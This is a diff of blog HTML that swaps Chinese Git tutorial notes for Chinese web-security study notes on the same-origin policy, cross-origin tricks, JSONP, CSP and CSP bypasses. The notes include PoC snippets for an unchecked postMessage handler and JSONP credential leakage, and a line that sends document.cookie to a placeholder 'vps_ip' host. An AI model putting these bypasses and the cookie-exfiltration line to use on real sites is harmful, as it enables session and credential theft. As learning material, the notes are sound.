-<li>vim README.md</li>
-<li>Hello world → wq</li>
-<li>git status</li>
-<li>git add README.md</li>
-<li>git commit -m “modify README.md”</li>
-<li>cd ..</li>
-<li>cd git-tutorial</li>
-<li>git pull origin master</li>
-<li>查看Github建立的仓库中的README.md是否有内容</li>
-</ul>
-<h3 id="0X02-Git的分支"><a href="#0X02-Git的分支" class="headerlink" title="0X02 Git的分支"></a>0X02 Git的分支</h3><ul>
-<li>版本发布、功能增加、错误修改</li>
-</ul>
-<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-1.PNG" alt="3-Git分支-1"></p>
-<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-2.PNG" alt="3-Git分支-2"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//不设置document.domain</span><br><span class="line">----test1.www.xyz/window_name_1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xtz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">----test2.www.xyz/window_name_2.php</span><br><span class="line">&lt;h1&gt;123&lt;/h&gt;</span><br><span class="line"></span><br><span class="line">//设置document.domain</span><br><span class="line">----test1.www.xyz/window_name_1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//bbb.evoa.me/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;document.domain = &quot;www.xyz&quot;&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/window_name_2.php</span><br><span class="line">&lt;h1&gt;123&lt;/h&gt;</span><br><span class="line">&lt;script&gt;document.domain = &quot;www.xyz&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sop_cors_csp/cors/document-name-alert.png" alt="document-name-alert"></p>
 <ul>
-<li>分支发布合并</li>
-</ul>
-<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-3.PNG" alt="3-Git分支-3"></p>
-<h5 id="Git分支操作"><a href="#Git分支操作" class="headerlink" title="Git分支操作"></a>Git分支操作</h5><ul>
-<li>创建分支：<strong><code>🔺命令：git branch 分支名</code></strong><ul>
-<li>基于某个分支创建的分支，会复制其内容</li>
+<li><p>注释</p>
+<ul>
+<li><p>document.domain只可以被设置为他的当前域或其当前域的父域</p>
+</li>
+<li><p>document.domain的赋值操作会导致端口号被重写为NULL，所以test1.<a href="http://www.xyz仅设置document.domain为www.xyz并不能与www.xyz进行通信，www.xyz的页面也必须赋值一次使双方端口相同从而通过浏览器的同源检测。这么做的目的是，如果子域有XSS，那么他的父域都存在安全隐患" target="_blank" rel="noopener">www.xyz仅设置document.domain为www.xyz并不能与www.xyz进行通信，www.xyz的页面也必须赋值一次使双方端口相同从而通过浏览器的同源检测。这么做的目的是，如果子域有XSS，那么他的父域都存在安全隐患</a></p>
+</li>
+<li><p>同一窗体不同窗口之间（iframe中的或window.open打开的）是能够获取到彼此的window对象的，如iframe.contentWindow可以获取iframe的window对象，但是不同源的情况下这个window对象的大部分属性和方法是受限制的</p>
+<p><img src="/images/sop_cors_csp/cors/document-name-cors.png" alt="document-name-cors"></p>
+</li>
 </ul>
 </li>
-<li>查看分支：<strong><code>🔺命令：git branch</code></strong></li>
-<li>跳转分支：<strong><code>🔺命令：git checkout 分支名</code></strong>   </li>
-<li>创建分支并跳转：<strong><code>🔺命令：git checkout -b 分支名</code></strong></li>
-<li>删除分支：<strong><code>🔺命令：git branch -d 分支名</code></strong><ul>
-<li>▲ 无合并到master的分支无法删除，或者使用-D参数`**</li>
+<li><p>▲ 如果某个子域为了和根域通信，根域设置了document.domain为根域，那么其他子域如果有xss漏洞可以直接跨同源攻击根域和同样设置了document.domain的其他子域</p>
+</li>
+</ul>
+<h3 id="0X03-window-name"><a href="#0X03-window-name" class="headerlink" title="0X03 window.name"></a>0X03 window.name</h3><ul>
+<li>window对象有个name属性，该属性有个特征<ul>
+<li>在一个窗口(window)的生命周期内，窗口载入的所有的页面都是共享一个window.name的</li>
+<li>每个页面对window.name都有读写的权限</li>
+<li>window.name是持久存在一个窗口载入过的所有页面中，并不会因新页面的载入而进行重置</li>
 </ul>
 </li>
-<li>合并分支：<strong><code>🔺命令：git merge 分支名</code></strong></li>
-</ul>
-<h5 id="Git-tutorial-Repository-1"><a href="#Git-tutorial-Repository-1" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
-<li>cd git-tutorial</li>
-<li>git branch feature1</li>
-<li>git branch</li>
-<li>git checkout feature1</li>
-<li>touch a.txt</li>
-<li>vim a.txt</li>
-<li>this is a.txt → wq</li>
-<li>git add a.txt</li>
-<li>git commit -m “a.txt”</li>
-<li>git branch feature2</li>
-<li>git checkout feature2</li>
-<li>git checkout -b feature3</li>
-<li>git branch</li>
-<li>git branch -d feature2</li>
-<li>touch b.txt</li>
-<li>vim b.txt</li>
-<li>this is b.txt → wq</li>
-<li>git add b.txt</li>
-<li>git commit -m “b.txt”</li>
-<li>git checkout master</li>
-<li>git branch -d feature3</li>
-<li>git merge feature3</li>
-<li>git push</li>
-<li>查看Github仓库是否有a.txt和b.txt，但无其他分支</li>
-<li>git branch feature1</li>
-<li>git push origin feature1</li>
-<li>查看Github仓库是否有feature1分支</li>
-<li>git push origin :feature1</li>
-<li>查看Github仓库是否无feature1分支</li>
-<li>git push origin feature1:f1</li>
-<li>查看Github仓库的feature1是否更改为f1</li>
-</ul>
-<h3 id="0X03-Git的合并"><a href="#0X03-Git的合并" class="headerlink" title="0X03 Git的合并"></a>0X03 Git的合并</h3><ul>
-<li>▲ 可以在Stackoverflow上看git log多样格式</li>
-<li>▲ rebase的黄金法则：绝对不要在公共分支使用rebase</li>
-<li>查看日志：git log<ul>
-<li>–oneline：一行的提交信息</li>
-<li>–oneline -3：只取前面3行</li>
-</ul>
-</li>
-<li>查看添加的内容：<strong><code>🔺命令：git show 哈希值</code></strong></li>
-<li>查看提交方式：<strong><code>🔺命令：git merge --help</code></strong><ul>
-<li>–ff（fast-forward）：默认不产生一次commit</li>
-<li>–no-ff：产生一个commit</li>
-</ul>
-</li>
-<li>移动分支，并将master分支的提交并入：<strong><code>🔺命令：git rebase</code></strong></li>
-<li>查看版本分支报错情况：<strong><code>🔺命令：git mergetool</code></strong><ul>
-<li>通过工具修改后，会生成一个x.txt.orig，保存冲突的现场</li>
+<li>▲ window.name几乎不受同源策略的影响</li>
+<li>测试代码<ul>
+<li>访问流程：通过Console台的xx.contentWindow.name访问iframe中的name属性，浏览器返回了跨域访问拒绝。但是我们通过设置iframe的src为3.php (3.php可以不与1.php同域)，在iframe中的所有页面共享window.name，然后3.php中的脚本访问到不同源的页面2.php并获取到了window.name</li>
 </ul>
 </li>
 </ul>
-<blockquote>
-<p>   merge和rebase<br>   merge：两个分支的修改提交，默认不提交，关注点在合并操作上<br>   rebase：将当前分支做的修改，复制在目标分支的最后一次中，关注点在开发的过程上 </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;iframe id=&apos;xx&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.name = &quot;flag&#123;this_is_flag&#125;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/3.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    alert(window.name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sop_cors_csp/cors/window-name-alert.png" alt="window-name-alert"></p>
+<ul>
+<li>注释<ul>
+<li>window.name的值只能是字符串的形式，这个字符串的大小最大能允许2M左右甚至更大的一个容量，具体取决于不同的浏览器</li>
+<li>▲ 不要把敏感数据存在window.name中，否则敏感数据可以被任何其他网页的JS脚本获取</li>
+</ul>
+</li>
+</ul>
+<h3 id="0X04-location-hash"><a href="#0X04-location-hash" class="headerlink" title="0X04 location.hash"></a>0X04 location.hash</h3><ul>
+<li>location.hash其实就是URL的锚部分(从#号开始的部分)</li>
+<li>原理<ul>
+<li>改变hash并不会导致页面刷新，所以可以利用hash值来进行数据传递</li>
+<li>不同域下location.hash也是不能相互读取的</li>
+</ul>
+</li>
+<li>具体做法<ul>
+<li>A域的页面a加载一个iframe，设置iframe的src为B域的b页面+#传输给b的数据</li>
+<li>此时b页面的js脚本可以通过读取location.hash获得页面a传过来的数据，然后在b页面再生成一个iframe，src指向A域的页面c+#传输给a的数据</li>
+<li>由于页面c与页面a同域同源，所以页面c的脚本可以修改a的locaition.hash</li>
+</ul>
+</li>
+</ul>
+<h3 id="0X05-PostMessage"><a href="#0X05-PostMessage" class="headerlink" title="0X05 PostMessage"></a>0X05 PostMessage</h3><ul>
+<li>▲ window.postMessage()方法可以安全地实现跨源通信</li>
+<li>当被调用时，会在所有页面脚本执行完毕之后向目标窗口派发一个MessageEvent消息函数<ul>
+<li>第一个参数为发送的消息</li>
+<li>第二个参数是匹配发送给的窗口的url地（可以使用*，代表无限制通配），若目标url和此参数不匹配，消息就不会被发送</li>
+</ul>
+</li>
+<li>被接受窗口则可以通过监听message事件来获取接受信息</li>
+<li>测试代码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        alert(e.data);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    parent.postMessage(&apos;test&apos;,&apos;*&apos;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sop_cors_csp/cors/postmessage-example.png" alt="postmessage-example"></p>
+<ul>
+<li>恶意代码测试（事件监听没有判断事件的来源）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php</span><br><span class="line">setcookie(&apos;flag&apos;,&apos;flag&#123;this_is_flag&#125;&apos;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;h1 id=&quot;name&quot;&gt;&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        document.getElementById(&apos;name&apos;).innerHTML = e.data</span><br><span class="line">        &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/evil.php</span><br><span class="line">&lt;iframe id=&quot;iframe&quot; src=&quot;//test1.www.xyz/1.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">//正则过滤的1.php</span><br><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;flag&quot;,&quot;flag&#123;this_is_flag&#125;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;h1 id=&quot;name&quot;&gt;&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        if(/^http:\/\/.*www\.xyz$/.test(e.origin))</span><br><span class="line">        document.getElementById(&apos;name&apos;).innerHTML = e.data;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;   --------------&gt; 绕过方法：需要一个存在后缀为www.xyz的域名即可</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sop_cors_csp/cors/postmessage-alert.png" alt="postmessage-alert"></p>
+<h3 id="0X06-JSONP"><a href="#0X06-JSONP" class="headerlink" title="0X06 JSONP"></a>0X06 JSONP</h3><ul>
+<li><code>&lt;script&gt;</code>标签可以跨域加载资源，但是返回内容如果不符合JS语法同样无法获取数据，JSONP则是通过返回符合JS语法的数据内容使资源能够跨域加载</li>
+<li>测试代码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function echoData(data)&#123;</span><br><span class="line">    console.log(&quot;DATA:&quot;,data);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;//test2.www.xyz/2.php?func=echoData&quot;&gt;&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;?php</span><br><span class="line">    header(&apos;Content-type: application/javascript&apos;);</span><br><span class="line">    $func = $_REQUEST[&apos;func&apos;]??&quot;func&quot;;</span><br><span class="line">    $data = &apos;[&quot;aaa&quot;,&quot;bbb&quot;,&quot;ccc&quot;,&quot;ddd&quot;]&apos;;</span><br><span class="line">    echo $func.&quot;(&quot;.$data.&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sop_cors_csp/cors/jsonp-example.png" alt="jsonp-example"></p>
+<ul>
+<li>运行过程：1.php页面先设定好输出数据的函数，通过<code>&lt;script&gt;</code>标签请求2.php并带有函数名参数，2.php把数据当函数参数传入并根据函数名输出对应函数调用语句，1.php获得响应后自动调用函数即可获取数据</li>
+<li>不存在任何验证的JSONP接口</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test2.www.xyz/evail.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function echoData(data)&#123;</span><br><span class="line">    alert(&quot;username：&quot;+data.username+&quot;password：&quot;+data.password);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;//test1.www.xyz/1.php?func=echoData&quot;&gt;&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php</span><br><span class="line">    header(&apos;Content-type: application/javascript&apos;);</span><br><span class="line">    $func = $_REQUEST[&apos;func&apos;]??&quot;func&quot;;</span><br><span class="line">    $data = &quot;&#123;&apos;username&apos;:&apos;test1&apos;,&apos;password&apos;:&apos;test1&apos;&#125;&quot;;</span><br><span class="line">    echo $func.&quot;(&quot;.$data.&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sop_cors_csp/cors/jsonp-username-password.jpg" alt="jsonp-username-password"></p>
+<ul>
+<li>▲ 未设置Conten-type可以导致反射性XSS<ul>
+<li>但是就算设置好了Conten-type也可能会有安全隐患</li>
+</ul>
+</li>
+<li>▲ 这种用户完全可控点可以结合很多其他缺陷产生漏洞，所以这种接口还应该过滤非法字符</li>
+<li>防御方法<ul>
+<li>验证referer，很多接口验证referer的正则有误，可以通过绕过正则继续攻击</li>
+<li>验证token</li>
+</ul>
+</li>
+</ul>
+<h2 id="内容安全策略"><a href="#内容安全策略" class="headerlink" title="内容安全策略"></a>内容安全策略</h2><blockquote>
+<p>   CSP, Content Security Policy</p>
 </blockquote>
-<h5 id="Git-tutorial-Repository-2"><a href="#Git-tutorial-Repository-2" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
-<li>cd git-tutorial</li>
-<li>git branch -d f1</li>
-<li>git push origin :f1</li>
-<li>git log</li>
-<li>q</li>
-<li>git log –oneline</li>
-<li>git log –oneline -3</li>
-<li>git show d156c23</li>
-<li>vi ~/.config → dog = log –all –decorate –oneline –graph</li>
-<li>git dog</li>
-<li>git checkout -b f1</li>
-<li>touch fa.txt</li>
-<li>git add fa.txt</li>
-<li>git commit -m “add fa”</li>
-<li>git dog</li>
-<li>git checkout master</li>
-<li>git merge f1</li>
-<li>git dog</li>
-<li>git checkout f1</li>
-<li>touch fb.txt</li>
-<li>git commit -m “add fb”</li>
-<li>git checkout f1</li>
-<li>git merge f1 –no-ff</li>
-<li>git dog</li>
-<li>git push</li>
-<li>git push origin f1</li>
-<li>远程修改master中的a.txt</li>
-<li>git pull</li>
-<li>git checkout f1</li>
-<li>git merge master</li>
-<li>git dog</li>
-<li>git checkout master</li>
-<li>touch m1.txt</li>
-<li>git add m1.txt</li>
-<li>git commit -m “add m1”</li>
-<li>git checkout f1</li>
-<li>git dog</li>
-<li>git rebase</li>
-<li>git dog</li>
-<li>git checkout -b f2</li>
-<li>vim a.txt</li>
-<li>this is b.txt</li>
-<li>git add a.txt</li>
-<li>git commit -m “update a.txt”</li>
-<li>git checkout f1</li>
-<li>vi a.txt</li>
-<li>this is c.txt</li>
-<li>git add a.txt</li>
-<li>git commit -m “update c.txt”</li>
-<li>git checkout f2</li>
-<li>git merge f1</li>
-<li>cat a.txt</li>
-<li>git mergetool</li>
-<li>rm a.txt.orig</li>
-<li>git commit -m “update a.txt”</li>
-<li>git dog</li>
-</ul>
-<h3 id="0X04-Git的回滚撤销"><a href="#0X04-Git的回滚撤销" class="headerlink" title="0X04 Git的回滚撤销"></a>0X04 Git的回滚撤销</h3><ul>
-<li>返回前一次的记录：<strong><code>🔺命令：git reset master^/~5/hash值id</code></strong><ul>
-<li>^：每一个^符号标识[前一次]，如^^^表示回退三次</li>
-<li><del>：回退次数加在后面，如</del>5</li>
-<li>hash值id：回退到id号的版本</li>
-<li>–mix：把暂存区的文件丢弃，但不会动到工作目录的文件（默认方式）</li>
-<li>–soft：工作目录跟暂存区的文件都不会被丢弃</li>
-<li>–hard：不管是工作目录以及暂存区的文件都会丢弃</li>
+<ul>
+<li>官方解释<ul>
+<li>一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本(XSS)和数据注入等攻击。这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途</li>
 </ul>
 </li>
-<li>所有的日志文件：<strong><code>🔺命令：git reflog</code></strong></li>
-<li>撤销某次操作：<strong><code>🔺命令：git revert</code></strong><ul>
-<li>此次操作之前和之后的commit和history都会保留，并且把这次撤销作为一次最新的提交</li>
+<li>通俗理解<ul>
+<li>开发者明确告诉客户端（制定比较严格的策略和规则），哪些外部资源是可以加载和执行的</li>
 </ul>
 </li>
-<li>▲ 在公用分支上应用revert，在私用分支上用reset</li>
-</ul>
-<blockquote>
-<pre><code>reset和revert
-revert：用一次新的commit来回滚之前的commit
-reset：只是将旧的commit指针移动，并无删除旧的commit</code></pre></blockquote>
-<h5 id="Git-tutorial-Repository-3"><a href="#Git-tutorial-Repository-3" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
-<li>cd git-tutorial</li>
-<li>touch hello.java</li>
-<li>git add hello.java</li>
-<li>git commit -m “hellp.java”</li>
-<li>git dog</li>
-<li>git reset master^</li>
-<li>git status</li>
-<li>ll</li>
-<li>git add hello.java</li>
-<li>git commit -m “add Hello.java”</li>
-<li>git dog</li>
-<li>git reset cd0309f</li>
-<li>git status</li>
-<li>git reset –hard 7d37397</li>
-<li>git status</li>
-<li>ll</li>
-<li>touch c.txt</li>
-<li>git add c.txt</li>
-<li>git commit -m “add c.txt”</li>
-<li>git dog</li>
-<li>git reset –soft 7d37397</li>
-<li>git status</li>
-<li>git reflog</li>
-<li>git reset –hard 00bd027</li>
-<li>ll</li>
-<li>git rest –hard HEAD</li>
-<li>git dog</li>
-<li>git revert</li>
-<li>git log</li>
-<li>git revert hash值id（Commit的ID）</li>
-<li>git dog</li>
-</ul>
-<h3 id="0X05-gitignore-fork同步"><a href="#0X05-gitignore-fork同步" class="headerlink" title="0X05 gitignore/fork同步"></a>0X05 gitignore/fork同步</h3><ul>
-<li>创建一个.gitignore文件，保存要忽略的内容<ul>
-<li>忽略系统生成的文件，如IDE的配置</li>
-<li>忽略编译生成的中间文件、可执行文件等</li>
-<li>忽略敏感的配置文件和本地不想提交的脚本</li>
-</ul>
-</li>
-<li>常用参数<ul>
-<li>配置文件：.settings/</li>
-<li>脚本文件：*.sh</li>
-<li>上次所有txt文件：!*.txt</li>
-<li>某个目录：/a/*.class</li>
-</ul>
-</li>
-<li>gitignore网站：<a href="https://www.gitignore.io" target="_blank" rel="noopener">https://www.gitignore.io</a></li>
-<li>查看远程的版本信息：<strong><code>🔺命令：git remote -v</code></strong></li>
-<li>增加一个远程仓库上传流：<strong><code>🔺命令：git remote add upstream https://...</code></strong></li>
-<li>更新远程仓库的版本：<strong><code>🔺命令：git fetch upstream 分支名</code></strong><ul>
-<li>分支名默认省略，则为master分支</li>
-<li>▲ pull = fetch + merge</li>
-</ul>
-</li>
-<li>查看远程原始仓库的分支：<strong><code>🔺命令：git branch -r</code></strong></li>
-</ul>
-<h5 id="Git-tutorial-Repository-4"><a href="#Git-tutorial-Repository-4" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
-<li>cd git-tutorial</li>
-<li>git add -A .</li>
-<li>git commit -m “add gitignore”</li>
-<li>git push -f</li>
-<li>git clone https://……awesome</li>
-<li>cd awesome</li>
-<li>git remote -v</li>
-<li>git remote add upstream https://…</li>
-<li>git remote -v</li>
-<li>git fetch upstream </li>
-<li>git branch -r</li>
-<li>git rebase upstream/master<ul>
-<li>merge关注的是提交的历史，将两次操作合并，但无提交数据，rebase则足够</li>
-</ul>
-</li>
-<li>git push</li>
-<li>git log</li>
-</ul>
-<h3 id="0X06-Git的免密传送"><a href="#0X06-Git的免密传送" class="headerlink" title="0X06 Git的免密传送"></a>0X06 Git的免密传送</h3><h5 id="Git传输的协议"><a href="#Git传输的协议" class="headerlink" title="Git传输的协议"></a>Git传输的协议</h5><ul>
-<li>local协议</li>
-<li>HTTP(S)协议：需要输入账号密码</li>
-<li>SSH协议：不需要输入账号密码</li>
-<li>Git协议</li>
-<li><a href="https://help.github.com/en/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent" target="_blank" rel="noopener">Git免密推送</a></li>
-</ul>
-<h5 id="SSH协议登陆"><a href="#SSH协议登陆" class="headerlink" title="SSH协议登陆"></a>SSH协议登陆</h5><ul>
-<li>在个人界面的Settings处</li>
-<li>SSH and GPG keys</li>
-<li>generating SSH keys</li>
-<li>Generating a new SSH key and adding it to the ssh-agent</li>
-<li>Windows<ul>
-<li>ssh-keygen -t rsa -b 4096 -C “<a href="mailto:643008933@qq.com" target="_blank" rel="noopener">643008933@qq.com</a>“<ul>
-<li>Enter a file in which to save the key (/c/Users/you/.ssh/id_rsa):[Press enter]</li>
-<li>Enter passphrase (empty for no passphrase): [Type a passphrase]</li>
-<li>Enter same passphrase again: [Type passphrase again]</li>
-</ul>
-</li>
-<li>eval $(ssh-agent -s)</li>
-<li>ssh-add ~/.ssh/id_rsa</li>
-<li>cat ~/.ssh/id_rsa.public</li>
-<li>复制公钥到New SSH Key</li>
-</ul>
-</li>
-<li>git clone with SSH</li>
-<li>touch a.txt</li>
-<li>git add a.txt</li>
-<li>git commit -m “add a.txt”</li>
-<li>git push（看是否需要账号密码登陆）</li>
-<li>▲ 2020.04.14 使用SSH协议登陆<ul>
-<li>git remote -v：查看git clone方式，如果是origin <a href="https://github.com......开头就说明需要调整" target="_blank" rel="noopener">https://github.com......开头就说明需要调整</a></li>
-<li>git remote rm origin：移除原来的git源</li>
-<li>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:xxx.git：添加新的git源头（地址修改为要调整的）</li>
-<li>git remote -v：再查看git方式，如果是origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>….就开头就说明OK了，重新commit或者push就不用每次都输入账号密码了</li>
+<li>概念理解<ul>
+<li>CSP就是一个统一有效的防止网站受到XSS攻击的防御方法</li>
+<li>CSP是一种白名单策略</li>
 </ul>
 </li>
 </ul>
-<h3 id="0X07-Git的工作流"><a href="#0X07-Git的工作流" class="headerlink" title="0X07 Git的工作流"></a>0X07 Git的工作流</h3><ul>
-<li><a href="https://github.com/xirong/my-git/blob/master/git-workflow-tutorial.md" target="_blank" rel="noopener">Git工作流指南</a></li>
-<li>集中式工作流</li>
-<li>功能分支工作流</li>
-<li>Gitflow工作流</li>
-<li>Forking工作流</li>
+<h5 id="启用CSP"><a href="#启用CSP" class="headerlink" title="启用CSP"></a>启用CSP</h5><ul>
+<li>通过HTTP头信息的Content-Security-Policy的字段（配置文件或者后端设置）</li>
+<li>通过网页的<code>&lt;meta&gt;</code>标签<ul>
+<li><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;&quot;&gt;</code></li>
 </ul>
-<h3 id="0X08-常用工具"><a href="#0X08-常用工具" class="headerlink" title="0X08 常用工具"></a>0X08 常用工具</h3><ul>
-<li>sourcetree</li>
-<li>vscode</li>
-<li>git图标：<a href="https://gitmoji.surge.sh" target="_blank" rel="noopener">https://gitmoji.surge.sh</a></li>
+</li>
+<li>修改的限制<ul>
+<li><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39; https://cdn.xxx.com&quot;&gt;</code>  -&gt; content添加白名单 -&gt; 即可以<code>script</code>标签引入cdb</li>
+</ul>
+</li>
+</ul>
+<h5 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h5><ul>
+<li>script-src: 定义了页面中Javascript的有效来源</li>
+<li>style-src：定义了页面中CSS样式的有效来源</li>
+<li>img-src: 定义了页面中图片和图标的有效来源</li>
+<li>font-src: 定义了字体加载的有效来源</li>
+<li>media-src: 用于限制允许传输视频和音频的来源。</li>
+<li>object-src: 可对 Flash 和其他插件进行控制。</li>
+<li>plugin-types: 用于限制页面可以调用的插件种类。</li>
+<li>child-src: 定义了web workers以及嵌套的浏览上下文（如<code>&lt;frame&gt;和&lt;iframe&gt;</code>）的源</li>
+<li>content-src: 定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源</li>
+<li>▲ default-src: 自定义默认形式<ul>
+<li>如果同时设置某个单项限制（比如font-src）和default-src，前者会覆盖后者，即字体文件会采用font-src的值，其他资源依然采用default-src的值</li>
+</ul>
+</li>
+</ul>
+<h5 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h5><ul>
+<li>‘none’ -&gt; img-src ‘none’<ul>
+<li>不允许任何内容</li>
+</ul>
+</li>
+<li>‘self’ -&gt; img-src ‘self’<ul>
+<li>代表和文档同源，包括相同的URL协议和端口号。两侧单引号是必须的。</li>
+</ul>
+</li>
+<li>‘unsafe-inline’ -&gt; script-src ‘unsafe-inline’<ul>
+<li>允许加载inline资源（例如常见的style属性，onclick，inline js和inline css等等）</li>
+</ul>
+</li>
+<li>‘unsafe-eval’ -&gt; script-src ‘unsafe-eval’<ul>
+<li>允许加载动态js代码，例如eval()</li>
+</ul>
+</li>
+<li>data: -&gt; img-src data:<ul>
+<li>允许来自相同来源的内容（相同的协议、域名和端口）</li>
+</ul>
+</li>
+<li>注解<ul>
+<li>如果不特别指定<code>&#39;unsafe-inline&#39;</code>时，页面上所有inline样式和脚本都不会执行</li>
+<li>不特别指定<code>&#39;unsafe-eval&#39;</code>，页面上不允许使用new Function，setTimeout，eval等方式执行动态代码</li>
+</ul>
+</li>
+</ul>
+<h5 id="收集不匹配规则的日志"><a href="#收集不匹配规则的日志" class="headerlink" title="收集不匹配规则的日志"></a>收集不匹配规则的日志</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//发生的CSP头</span><br><span class="line">Content-Security-Policy-Report-Only: script-src &apos;self&apos;; report-uri http://test/</span><br><span class="line"></span><br><span class="line">//这样，如果页面上有inline JS，依然会执行，只是浏览器会向指定地址发送一个POST请求，包含这样的信息</span><br><span class="line">&#123;&quot;csp-report&quot;:&#123;&quot;document-uri&quot;:&quot;http://test/test.php&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;violated-directive&quot;:&quot;script-src &apos;self&apos;&quot;,&quot;original-policy&quot;:&quot;script-src &apos;self&apos;; report-uri http://test/&quot;,&quot;blocked-uri&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP" target="_blank" rel="noopener">内容安全策略 (CSP)</a></li>
+</ul>
+<h2 id="内容安全策略的绕过"><a href="#内容安全策略的绕过" class="headerlink" title="内容安全策略的绕过"></a>内容安全策略的绕过</h2><ul>
+<li>location.href</li>
+<li>link标签导致的绕过</li>
+<li>使用iframe绕过</li>
+<li>用CDN绕过</li>
+<li>站点可控静态资源绕过</li>
+<li>站点可控JSONP绕过</li>
+<li>Base-uri绕过</li>
+<li>不完整script绕过nonce</li>
+<li>object-src绕过（PDFXSS） -&gt; 暂无学</li>
+<li>SVG绕过</li>
+<li>不完整的资源标签获取资源</li>
+<li>CSS选择器获取内容  -&gt;  暂无学</li>
+<li>CRLF绕过</li>
+</ul>
+<h3 id="0X00-location-href"><a href="#0X00-location-href" class="headerlink" title="0X00 location.href"></a>0X00 location.href</h3><ul>
+<li>CSP不影响location.href跳转</li>
+<li>利用条件<ul>
+<li>可以执行任意JS脚本，但是由于受到CSP影响无法外带数据</li>
+</ul>
+</li>
+<li>将cookie打到个人vps上<ul>
+<li><code>location.href = &quot;vps_ip:xxxx?+document.cookie</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="0X01-link标签导致的绕过"><a href="#0X01-link标签导致的绕过" class="headerlink" title="0X01 link标签导致的绕过"></a>0X01 link标签导致的绕过</h3><ul>
